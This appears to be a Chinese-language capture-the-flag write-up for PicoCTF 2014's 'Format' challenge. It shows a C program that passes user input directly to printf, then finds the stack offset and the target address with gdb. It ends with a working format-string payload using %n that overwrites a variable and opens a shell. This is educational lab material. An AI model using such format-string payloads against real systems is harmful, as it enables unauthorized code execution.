# Pico CTF 2014 : Format
## **[原理]**
nc基础。
## **[目的]**
掌握PWN题目的大致流程。
## **[环境]**
Ubuntu。
## **[工具]**
gdb、objdump、python。
## **[步骤]**


源代码:
	
	#include <stdio.h>
	#include <stdlib.h>
	#include <fcntl.h>
	
	int secret = 0;
	
	void give_shell(){
	    gid_t gid = getegid();
	    setresgid(gid, gid, gid);
	    system("/bin/sh -i");
	}
	
	int main(int argc, char **argv){
	    int *ptr = &secret;
	    printf(argv[1]);
	
	    if (secret == 1337){
	        give_shell();
	    }
	    return 0;
	}

所以我们需要以某种方式找到一种将秘密的值更改为1337的方式，使用格式字符串攻击，因为printf（）函数未正确实现。 首先，先了解一下堆栈的样子。

注意：在这个问题中，环境变量与堆栈混淆，所以在运行命令之前，先使用'env -i'命令清除环境，这样做是有帮助的。
	
	pico1139@shell:/home/format$ for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x;echo ;done | grep 4141
	Offset: 105:AAAA41414141

这意味着我们可以从堆栈顶部看到偏移量为105的输入。 但是，当您添加更多数据时，原始输入的偏移量会发生变化，因此请先添加1333个更多字节的数据，然后查看偏移量。 （1337是我们想要的秘密，我们将写四字节（AAAA），所以1333 + 4 = 1337）
	
	for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
	Offset: 103:AAAA41410074
	Offset: 104:AAAA31254141

所以我们再次发现了我们的A，但是它们并不在栈上。 最后再添加两个A，看看是否可以让它排队。
	
	for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
	Offset: 103:AAAA41414141

好！ 我们的偏移是103.现在我们需要找出用来改变“秘密”中的数据的地址
	
	pico1139@shell:/home/format$ gdb -q format
	Reading symbols from format...(no debugging symbols found)...done.
	(gdb) disass main
	Dump of assembler code for function main:
	   0x080484e2 <+0>:	push   %ebp
	   0x080484e3 <+1>:	mov    %esp,%ebp
	   0x080484e5 <+3>:	and    $0xfffffff0,%esp
	   0x080484e8 <+6>:	sub    $0x20,%esp
	   0x080484eb <+9>:	movl   $0x804a030,0x1c(%esp)
	   0x080484f3 <+17>:	mov    0xc(%ebp),%eax
	   0x080484f6 <+20>:	add    $0x4,%eax
	   0x080484f9 <+23>:	mov    (%eax),%eax
	   0x080484fb <+25>:	mov    %eax,(%esp)
	   0x080484fe <+28>:	call   0x8048350 <printf@plt>
	   0x08048503 <+33>:	mov    0x804a030,%eax
	   0x08048508 <+38>:	cmp    $0x539,%eax
	   0x0804850d <+43>:	jne    0x8048514 <main+50>
	   0x0804850f <+45>:	call   0x80484ad <give_shell>
	   0x08048514 <+50>:	mov    $0x0,%eax
	   0x08048519 <+55>:	leave  
	   0x0804851a <+56>:	return

看起来地址0x0804a030被放置在* ptr中。 这就是我们需要用来代替我们A的地址。 为了将数字1337置于秘密的内存地址中，我们需要使用％n修饰符。 （％103 $ n将查看位于偏移103处的数据作为存储器地址，并将到目前为止写入的字节总数写入该地址。）
	
	pico1139@shell:/home/format$ env -i ./format $(python -c 'print "\x30\xa0\x04\x08"+"%1333u%103$nAA"')
	$ id
	uid=11066(pico1139) gid=1008(format) groups=1017(picogroup)
	$ ls
	Makefile  flag.txt  format  format.c
	$ cat flag.txt
	xctf{XXXXXX}




## **[总结]**
Master the general idea of doing the PWN topic, learn to find and modify shellcode.